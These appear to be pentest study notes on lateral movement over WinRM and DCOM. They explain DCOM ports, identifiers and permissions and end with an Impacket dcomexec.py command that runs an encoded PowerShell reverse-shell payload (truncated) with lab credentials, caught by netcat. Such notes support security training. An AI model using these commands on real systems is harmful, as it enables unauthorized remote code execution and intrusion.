The Members in Remote Management Users group can access winrm
port .WinRM communication primarily utilizes TCP port 5985 for HTTP and 5986 for HTTPS

### Lateral Movement from Windows
- Invoke-Command
- Enter-PSSession

## Distributed Component Object Model
**DCOM (Distributed Component Object Model)** is a Microsoft technology that enables communication between software components (objects) across a network. It is an extension of the **Component Object Model (COM)**, which is a framework for creating and interacting with software components in Windows environments. DCOM extends the COM concept to support remote communication, allowing components running on different computers to interact as if they were local.

### Key Concepts of DCOM:

1. **Component Object Model (COM)**:
    
    - COM is a standard for software components to interact with each other. It allows different applications and services to use each other's functionality by exposing **interfaces** that other software can interact with.
    - COM is typically used within the same machine (local communication), but DCOM is designed to work across a network (remote communication).
2. **Distributed Computing**:
    
    - DCOM enables the distribution of software components across different machines connected via a network, such as over TCP/IP. This allows a Windows-based program to invoke and interact with components running on remote machines.
3. **Network Communication**:
    
    - DCOM operates on top of **Remote Procedure Call (RPC)**, which allows a program to call a procedure (function) on another machine as if it were a local procedure. This makes distributed computing more seamless by hiding the complexities of remote communication.
4. **Port Usage**:
    
    - **Port 135** is used for the initial communication (known as the RPC endpoint mapper) in DCOM-based communication.
    - Once the initial connection is established on port 135, DCOM uses **dynamic ports** in the range **49152-65535** for subsequent communication between the client and server.
5. **Registry and Identifiers**: DCOM relies on several identifiers stored in the Windows registry to identify and configure objects:
    - **CLSID (Class Identifier)**: A unique **GUID** that points to the location of the component in the registry, identifying its implementation (whether it's a DLL or an executable).
    - **ProgID (Programmatic Identifier)**: A user-friendly name for the object that can be used instead of the CLSID. It is not always unique and is optional.
    - **AppID (Application Identifier)**: A string that specifies configuration settings, such as access permissions, for one or more COM objects. This helps configure how the objects interact with each other and define user rights.

6. **DCOM Permissions**:
    
    - **Distributed COM Users** and **Administrators** groups typically have the necessary permissions to interact with DCOM objects on remote machines.
    - To access and manipulate DCOM objects remotely, users need appropriate rights, which can be managed through the **DCOMCNFG tool**, **Group Policy**, or the **Windows Registry**.

### Lateral Movement From Linux
### Domexec.py
dcomexec.py from Impacket provides an interactive shell on a remote Windows host, similar to wmiexec.py , but utilizes different DCOM endpoints for command execution. It operates over TCP port 445, retrieving output via the ADMIN$ share.This tool supports DCOM objects like MMC20.Application , ShellWindows , ShellBrowserWindow offering alternative remote execution methods. 

- use netcat to catch revshell
```
python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias: [email protected] "powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -silentcommand
```
- Alternatively, dcomexec.py also supports ShellWindows & ShellBrowserWindow objects; we can substitute MMC20 and if those are enabled, it will allow us to perform code execution.

- In case the TCP port 445 is not available, we can use the option -no-output . This will disable the output and it won't try to use port 445 for connections.